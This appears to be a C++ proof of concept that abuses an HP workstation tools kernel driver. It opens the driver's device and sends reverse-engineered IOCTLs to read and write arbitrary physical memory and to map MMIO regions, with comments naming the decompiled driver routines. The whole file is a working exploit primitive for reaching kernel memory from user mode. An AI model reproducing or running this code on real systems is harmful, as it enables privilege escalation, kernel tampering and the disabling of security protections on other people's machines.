#include <windows.h>
#include <iostream>
#include <vector>
#include <cstdint>

// ==========================================
// STRUCT DEFINITIONS (Aligned with driver code)
// ==========================================

#pragma pack(push, 1)
typedef struct _READ_INPUT {
    uint64_t PhysicalAddress; // Target physical/MMIO address
    uint32_t TransferLength;  // Number of bytes to read
} READ_INPUT, *PREAD_INPUT;

typedef struct _WRITE_INPUT {
    uint64_t PhysicalAddress; // Target physical/MMIO address
    uint32_t TransferLength;  // Number of bytes to write
    uint64_t SourceBufferPtr; // Pointer to user-mode data to write from
    uint32_t MaxBufferSize;   // Maximum buffer bound check
} WRITE_INPUT, *PWRITE_INPUT;

typedef struct _MAP_INPUT {
    uint64_t PhysicalAddress;
    uint32_t TransferLength;
} MAP_INPUT, *PMAP_INPUT;

// Structure matching what sub_1400013A8 returns and sub_1400017BC expects
typedef struct _MAP_OUTPUT {
    uint64_t MappedIoSpace;
    uint64_t MappedLockedPages;
    uint64_t MdlPointer;
    uint64_t Length;
} MAP_OUTPUT, *PMAP_OUTPUT;
#pragma pack(pop)

// ==========================================
// PROTOTYPES & FUNCTIONS
// ==========================================

void TriggerRead(HANDLE hDevice, uint64_t targetAddress, uint32_t size) {
    READ_INPUT input = { 0 };
    input.PhysicalAddress = targetAddress;
    input.TransferLength = size;

    std::vector<uint8_t> outputBuffer(size);
    DWORD bytesReturned = 0;

    // Corrected Read IOCTL: 0x9C40610C (sub_14000173C)
    BOOL success = DeviceIoControl(
        hDevice,
        0x9C40610C,
        &input,
        sizeof(input),
        outputBuffer.data(),
        (DWORD)outputBuffer.size(),
        &bytesReturned,
        NULL
    );

    if (success) {
        printf("[+] Successfully read %d bytes from physical address 0x%llX!\n", bytesReturned, targetAddress);
    } else {
        printf("[-] Read IOCTL failed: %d\n", GetLastError());
    }
}

void TriggerWrite(HANDLE hDevice, uint64_t targetAddress, const std::vector<uint8_t>& payload) {
    WRITE_INPUT input = { 0 };
    input.PhysicalAddress = targetAddress;
    input.TransferLength = (uint32_t)payload.size();
    input.SourceBufferPtr = (uint64_t)payload.data(); 
    input.MaxBufferSize = (uint32_t)payload.size();

    DWORD bytesReturned = 0;

    // Correct Write IOCTL: 0x9C40A110 (sub_140001814)
    BOOL success = DeviceIoControl(
        hDevice,
        0x9C40A110,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (success) {
        printf("[+] Successfully wrote %zu bytes to physical address 0x%llX!\n", payload.size(), targetAddress);
    } else {
        printf("[-] Write IOCTL failed: %d\n", GetLastError());
    }
}

void TestMapUnmapLifecycle(HANDLE hDevice, uint64_t targetAddress, uint32_t size) {
    MAP_INPUT input = { 0 };
    input.PhysicalAddress = targetAddress;
    input.TransferLength = size;

    MAP_OUTPUT outputContext = { 0 };
    DWORD bytesReturned = 0;

    // --- STEP 1: MAP THE REGION ---
    // Correct Map IOCTL: 0x9C406104 (sub_1400013A8)
    BOOL mapSuccess = DeviceIoControl(
        hDevice,
        0x9C406104,
        &input,
        sizeof(input),
        &outputContext,
        sizeof(outputContext),
        &bytesReturned,
        NULL
    );

    if (!mapSuccess) {
        printf("[-] Map IOCTL failed: %d\n", GetLastError());
        return;
    }

    printf("[+] Successfully mapped physical address 0x%llX!\n", targetAddress);
    printf("    -> Mapped IoSpace Ptr: 0x%llX\n", outputContext.MappedIoSpace);
    printf("    -> Locked Pages Ptr:   0x%llX\n", outputContext.MappedLockedPages);
    printf("    -> MDL Pointer:        0x%llX\n", outputContext.MdlPointer);
    printf("    -> Length:             0x%llX\n", outputContext.Length);

    // --- STEP 2: UNMAP / CLEAN UP ---
    // Correct Unmap IOCTL: 0x9C40A108 (sub_1400017BC)
    DWORD unmapBytesReturned = 0;
    BOOL unmapSuccess = DeviceIoControl(
        hDevice,
        0x9C40A108,
        &outputContext, // Pass context back as input
        sizeof(outputContext),
        NULL,
        0,
        &unmapBytesReturned,
        NULL
    );

    if (unmapSuccess) {
        printf("[+] Successfully unmapped and freed resources.\n");
    } else {
        printf("[-] Unmap IOCTL failed: %d\n", GetLastError());
    }
}

int main() {
    HANDLE hDevice = CreateFileA(
        "\\\\.\\Device\\HP_WKS_SWTOOLS_DRIVER",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: %d\n", GetLastError());
        return 1;
    }

    printf("[+] Successfully opened driver device handle.\n");

    // Example Test Call (Ensure you provide a valid test target range if testing)
    // TriggerRead(hDevice, 0x1000, 64);
    
    CloseHandle(hDevice);
    return 0;
}